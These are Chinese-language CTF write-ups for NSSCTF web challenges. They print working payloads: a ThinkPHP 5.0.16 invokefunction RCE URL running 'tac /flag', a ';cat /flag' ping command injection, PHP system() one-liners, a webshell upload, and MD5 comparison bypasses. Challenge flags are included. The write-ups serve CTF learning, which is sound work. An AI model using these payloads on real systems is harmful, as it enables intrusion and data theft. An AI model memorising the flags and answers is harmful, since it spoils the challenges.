        b_char = (bin(char)[2:])
        b_char = '0'*(8-len(b_char)) + b_char
        tmp_str += b_char
    for i in range(len(tmp_str)//6):
        temp_nub = int(tmp_str[i*6:6*(i+1)],2)
        ret += string2[temp_nub]
    if remain==2:
        remain_str = tmp_str[-4:] + '0'*2
        temp_nub = int(remain_str,2)
        ret += string2[temp_nub] + "="
    elif remain==1:
        remain_str = tmp_str[-2:] + '0'*4
        temp_nub = int(remain_str,2)
        ret += string2[temp_nub] + "="*2
    return ret.replace("=","")

res = encode(input(),string.ascii_uppercase+string.ascii_lowercase+string.digits+'+/')

if res == "TlNTQ1RGe2Jhc2U2NCEhfQ":
    print("good!")
else:
    print("bad!")
```

额，这个不就是bs64编码吗？？？

## P2638 SWPUCTF 2022 新生赛]奇妙的MD5

打开看见一个界面

提示 <font style="color:rgb(0, 0, 0);">可曾听过ctf 中一个奇妙的字符串</font>

<font style="color:rgb(0, 0, 0);">看前端啥也看不出来</font>

<font style="color:rgb(0, 0, 0);">POST传参发现数组绕过不行，没什么思路</font>

<font style="color:rgb(0, 0, 0);">dirsearch.py也扫描不出来任何东西</font>

<font style="color:rgb(0, 0, 0);">看一下题解，发现是ffifdyop，为什么？</font>

<font style="color:rgb(0, 0, 0);">这个东西是科学计数法的0，额，没想到啊</font>

<font style="color:rgb(0, 0, 0);">之后又进到一个界面</font>

```plain
$x= $GET['x'];
$y = $_GET['y'];
if($x != $y && md5($x) == md5($y)){
    ;
```

直接看前端能考到这样的提示

这个不简单嘛，x不等于y那么直接数组绕过就行了

行了，注入进去了，然后是php代码

```plain
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
}
```

还是数组绕过，这里科学计数法不行了

## P3004 \[NSSRound#6 Team]check(V2)

直接把源代码给我们了

```plain

# -*- coding: utf-8 -*-
from flask import Flask,request
import tarfile
import os

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['tar'])

def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    with open(__file__, 'r') as f:
        return f.read()

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return '?'
    file = request.files['file']
    if file.filename == '':
        return '?'
    print(file.filename)
    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a tarfile'
    try:
        tar = tarfile.open(file_save_path, "r")
        tar.extractall(app.config['UPLOAD_FOLDER'])
    except Exception as e:
        return str(e)
    os.remove(file_save_path)
    return 'success'

@app.route('/download', methods=['POST'])
def download_file():
    filename = request.form.get('filename')
    if filename is None or filename == '':
        return '?'
    
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    
    if '..' in filename or '/' in filename:
        return '?'
    
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        return '?'
    
    with open(filepath, 'r') as f:
        return f.read()
    
@app.route('/clean', methods=['POST'])
def clean_file():
    os.system('su ctf -c /tmp/clean.sh')
    return 'success'

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, port=80)
```

我菜，直接一行行解释代码

```plain
app = Flask(__name__)  # 创建Flask应用实例
app.config['UPLOAD_FOLDER'] = './uploads'  # 设置上传文件存放的目录
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024  # 设置最大上传文件大小为100KB
ALLOWED_EXTENSIONS = set(['tar'])  # 设置允许上传的文件扩展名为tar
```

第一部分是声明一个网站，作用是可以接受文件，并且是存放在/upload这个目录下

从这里可以看出来，因为是后端的检测，所以前端绕过并不启用，可以尝试双写或者是直接在tar文件里面加东西

```plain
def allowed_file(filename):
    # 定义allowed_file函数，检查文件名是否合法，即是否包含扩展名且扩展名在允许的集合内
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

检查文件名是否合法，分割依次，要求分割后是tar文件，双写应该没戏

```python
@app.route('/')
def index():
    # 定义路由为根目录的视图函数index，读取当前文件内容并返回
    with open(__file__, 'r') as f:
        return f.read()
```

就是读取当前文件内容，没什么好说的

```python
@app.route('/upload', methods=['POST'])
def upload_file():
    # 定义路由为/upload的视图函数upload_file，处理文件上传请求
    if 'file' not in request.files:#这个file是POST传入的参数
        # 检查请求中是否包含文件
        return '?'
    file = request.files['file']
    if file.filename == '':
        # 检查文件名是否为空
        return '?'
    print(file.filename)
    # 打印文件名
    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:
        # 检查文件是否合法，即..不能在文件里面，/不能再文件里面
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
        # 构建文件保存路径
        if os.path.exists(file_save_path):
            # 检查文件是否已存在
            return 'This file already exists'
        file.save(file_save_path)
        # 保存文件
    else:
        return 'This file is not a tarfile'
        # 如果文件不合法，返回错误信息
    try:
        tar = tarfile.open(file_save_path, "r")
        # 打开tar文件
        tar.extractall(app.config['UPLOAD_FOLDER'])
        # 解压tar文件到指定目录
    except Exception as e:
        # 捕获解压过程中可能出现的异常
        return str(e)
        # 返回异常信息
    os.remove(file_save_path)
    # 删除原始tar文件
    return 'success'
    # 如果上传、解压和删除过程成功，返回'success'
```

既然有解压的命令，那么就要想到经典的linux软链接，即再linux中连接一个命令

## P3245 \[NCTF 2021]baibaibai

代码审计，能下载源码

发现thinkphp版本是5.0.16

可以直接上网搜索这个漏洞，能搜索得到

注意/public/index.php里面的`define('APP_PATH', __DIR__ . '/../application/');`

说明至今进入到了/application目录下，能通过这个php调用这个文件夹下的其他文件

那么直接执行命令

<code>/public//?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /;tac /flag</code>

## P3740 \[GDOUCTF 2023]EZ WEB

dirsearch.py扫描到/src文件夹

```plain
import flask

app = flask.Flask(__name__)

@app.route('/', methods=['GET'])
def index():
  return flask.send_file('index.html')

@app.route('/src', methods=['GET'])
def source():
  return flask.send_file('app.py')

@app.route('/super-secret-route-nobody-will-guess', methods=['PUT'])
def flag():
  return open('flag').read()
```

挺抽象的，估计是考察你的python功底

```cpp
@app.route('/', methods=['GET'])
def index():
  return flask.send_file('index.html')
```

只允许你使用GET方法访问index.html

```cpp
@app.route('/src', methods=['GET'])
def source():
  return flask.send_file('app.py')
```

当你以GET方法访问src的时候，直接把app.py打印到前端

```cpp
@app.route('/super-secret-route-nobody-will-guess', methods=['PUT'])
def flag():
  return open('flag').read()
```

如果以PUT方法访问`/super-secret-route-nobody-will-guess`，直接给出flag

## <font style="color:rgb(0, 0, 0);">P3861 \[LitCTF 2023]我Flag呢？</font>

我服了，直接页面下就有

## P3864 <font style="color:rgb(0, 0, 0);">\[LitCTF 2023]Follow me and hack me</font>

直接打开就能看见页面的要求，要求GET传一个参数和POST传一个参数，然后 就没有任何信息了，所以我们可以打开hackbar传参了

```cpp
<body>
    <h1>前端写累了，看点素的吧，没有荤的了（</h1>
    <div class="form-wrapper">
            <div class="form-group">
                <label for="ctf-input">你知道 GET 么，试试用GET传参一个变量名为CTF 值为Lit2023</label>
                <input type="text" id="ctf-input" name="ctf" placeholder="Like this Lit2023">
            </div>
            <div class="form-group">
                <label for="challenge-input">下面试试POST，尝试用POST传输一个变量名为Challenge 值为 i'm_c0m1ng</label>
                <input type="text" id="challenge-input" name="challenge" placeholder="Like this i'm_c0m1ng">
            </div>
            <input type="submit" value="提交按钮被我撬掉了x别按了">
        NSSCTF{84c744b9-c5dc-4efb-904f-e571baf95e76}<div class="success-message">他说备份文件还有好吃的！</div>                    </div>
                    
                    </body>
                    </html>
```

## <font style="color:rgb(0, 0, 0);">P3865 \[LitCTF 2023]PHP是世界上最好的语言！！</font>

直接打开发现是一个php执行界面，直接输入指令就可以执行

`<?php system("tac /flag");?>`

其实还可以查看一下目录

`<?php system("ls /");?>`

在根目录中能看到flag

## P3866 \[LitCTF 2023]Vim yyds

直接dirsearch.py扫描，扫描出来有一个.index.php.swp文件

直接在网址上输入这个文件，发现下载了一个二进制文件，用010editor打开看一下，winhex也可以

![1765329307573-5c339fac-04e2-4d0e-a17e-eec0d2ca1708.png](./img/sP6fq2n3ZbmMzTLH/1765329307573-5c339fac-04e2-4d0e-a17e-eec0d2ca1708-496270.png)

那就是传入`password`的bs64形式，即`Give_Me_Your_Flag`的bs64形式

`R2l2ZV9NZV9Zb3VyX0ZsYWc=`

那么给出POST的

```cpp
cmd=cat ../../../flag
&
password=R2l2ZV9NZV9Zb3VyX0ZsYWc=
```

## <font style="color:rgb(0, 0, 0);">P3863 \[LitCTF 2023]导弹迷踪</font>

直接打开是一个游戏，什么都抓不出来

直接BP看一下有没有什么传参和cookie

![1764811840476-8425155b-026d-4661-b759-9a0941517b82.png](./img/sP6fq2n3ZbmMzTLH/1764811840476-8425155b-026d-4661-b759-9a0941517b82-441710.png)

发现cookie中间所有的都是默认设置，没有什么信息

至于玩游戏吗，不可能的，这辈子都不可能的

所以直接看js源代码，看看能不能通过控制台更改参数来直接获取结果

![1764811896785-0edd6690-3687-46c6-b620-3962072c7a4d.png](./img/sP6fq2n3ZbmMzTLH/1764811896785-0edd6690-3687-46c6-b620-3962072c7a4d-913606.png)

然后发现一个game.js文件中已经有了flag，可以直接设置mLEVEL=6或者直接把这个取出来就行

最后拼接一下就可以输出了

## P3867 \[LitCTF 2023]作业管理系统

打开就是一个登录界面，看一下源代码发现用户名和密码都是admin

直接登录，然后直接写一段php的webshell

啊？注入进去了？

直接打开/1.php就行了？

\~~这怎么水字数啊~~

直接蚁剑连接找flag就行了

在根目录下

`NSSCTF{c9d6682e-7a9f-49c4-a64e-0fa0c12108fc}`

## P3871 \[LitCTF 2023]1zjs

```cpp

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>morefun</title>
  <style>
    body, html {
      margin: 0;
      overflow: hidden;
      background: #2a3039;
    }
  </style>
</head>
<body>
  <script src="./dist/index.umd.js"></script>
  <script>
    new CreepCube()
  </script>
</body>
</html>
```

这个是什么东西，好像看不出来什么东西

点进`./dist/index.umd.js`，可以找到一个提示：`f@k3f1ag.php`

然后直接在网站里面搜索

找到了，丢进控制台编译一下

额，做出来了

`NSSCTF{e3998a4f-2ed0-4cbd-ba27-5d2b527a720f}`

## P3873 \[LitCTF 2023]Ping

可以从前端看到一个js代码

```cpp
  function check_ip(){
    let ip = document.getElementById('command').value;
    let re = /^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/;

    if(re.test(ip.trim())){
      return true;
    }
    alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦');
    return false;
  }
```

这段代码的主要所用就是筛选ping值的内容

但是问题来了，这个是前端，众所周知前端的检测跟没有没啥区别，那么我们就使用BP直接抓包注入

只需要使用`;`进行命令拼接，会将结果直接输出出来的。

所以直接命令`127.0.0.1;cat /flag`

## <font style="color:rgb(0, 0, 0);">P7083 \[NSSCTF 4th]ez\_upload</font>

直接一个界面，说是上传zip文件，但是上传了以后没有任何的回显与提示

不知道为什么

## <font style="color:rgb(0, 0, 0);">P7085 \[NSSCTF 4th]EzCRC</font>

打开是一个misc，不知道为什么被端到了web题目上面来

```cpp
<?php
error_reporting(0);
ini_set('display_errors', 0);
highlight_file(__FILE__);


function compute_crc16($data) {
    $checksum = 0xFFFF;
    for ($i = 0; $i < strlen($data); $i++) {
        $checksum ^= ord($data[$i]);
        for ($j = 0; $j < 8; $j++) {
            if ($checksum & 1) {
                $checksum = (($checksum >> 1) ^ 0xA001);
            } else {
                $checksum >>= 1;
            }
        }
    }
    return $checksum;
}

function calculate_crc8($input) {
    static $crc8_table = [
        0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
        0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
        0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
        0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
        0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
        0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
        0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
        0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
        0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
        0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
        0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
        0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
        0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
        0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
        0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
        0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
        0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
        0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
        0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
        0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
        0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
        0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
        0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
        0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
        0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
        0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
        0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
        0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
        0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
        0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
        0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
        0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
    ];

    $bytes = unpack('C*', $input);
    $length = count($bytes);
    $crc = 0;
    for ($k = 1; $k <= $length; $k++) {
        $crc = $crc8_table[($crc ^ $bytes[$k]) & 0xff];
    }
    return $crc & 0xff;
}

$SECRET_PASS = "Enj0yNSSCTF4th!";
include "flag.php";

if (isset($_POST['pass']) && strlen($SECRET_PASS) == strlen($_POST['pass'])) {
    $correct_pass_crc16 = compute_crc16($SECRET_PASS);
    $correct_pass_crc8 = calculate_crc8($SECRET_PASS);

    $user_input = $_POST['pass'];
    $user_pass_crc16 = compute_crc16($user_input);
    $user_pass_crc8 = calculate_crc8($user_input);

    if ($SECRET_PASS === $user_input) {
        die("这样不行");
    }

    if ($correct_pass_crc16 !== $user_pass_crc16) {
        die("这样也不行");
    }

    if ($correct_pass_crc8 !== $user_pass_crc8) {
        die("这样还是不行吧");
    }

    $granted_access = true;

    if ($granted_access) {
        echo "都到这份上了,flag就给你了: $FLAG";
    } else {
        echo "不不不";
    }
} else {
    echo "再试试";
}

?>
```

看起来是要crc16和crc8编码一样的字符串

索性直接ai一下结果，然后自己生成

```cpp
import itertools

# CRC16函数（参考题目中的PHP实现）
def compute_crc16(data):
    checksum = 0xFFFF
    for byte in data.encode('utf-8'):
        checksum ^= byte
        for _ in range(8):
            if checksum & 1:
                checksum = (checksum >> 1) ^ 0xA001
            else:
                checksum >>= 1
    return checksum & 0xFFFF

# CRC8函数（参考题目中的PHP实现）
def calculate_crc8(data):
    crc8_table = [
        0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
        0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
        0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
        0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
        0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
        0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
        0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
        0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
        0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
        0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
        0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
        0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
        0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
        0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
        0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
        0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
        0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
        0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
        0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
        0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
        0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
        0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
        0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
        0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
        0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
        0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
        0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
        0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
        0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
        0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
        0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
        0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
    ]

    crc = 0
    for byte in data.encode('utf-8'):
        crc = crc8_table[(crc ^ byte) & 0xFF]
    return crc

# 查找满足CRC条件的密码
def find_matching_password(target_crc16, target_crc8):
    # 假设密码是字母、数字和特殊字符的组合
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-="
    for length in range(15, 16):  # 尝试不同长度的密码
        for password_tuple in itertools.product(charset, repeat=length):
            password = ''.join(password_tuple)
            crc16_value = compute_crc16(password)
            crc8_value = calculate_crc8(password)
            if password == "Enj0yNSSCTF4th!":
                continue
            if crc16_value == target_crc16 and crc8_value == target_crc8:
                return password
    return None

# CRC16和CRC8校验值
target_crc16 = 0x436e
target_crc8 = 0xa3

# 查找符合条件的密码
matching_password = find_matching_password(target_crc16, target_crc8)

if matching_password:
    print(f"找到符合条件的密码: {matching_password}")
else:
    print("未找到符合条件的密码。")

```

生成的结果是`aaaaaaaaaac7$c4`

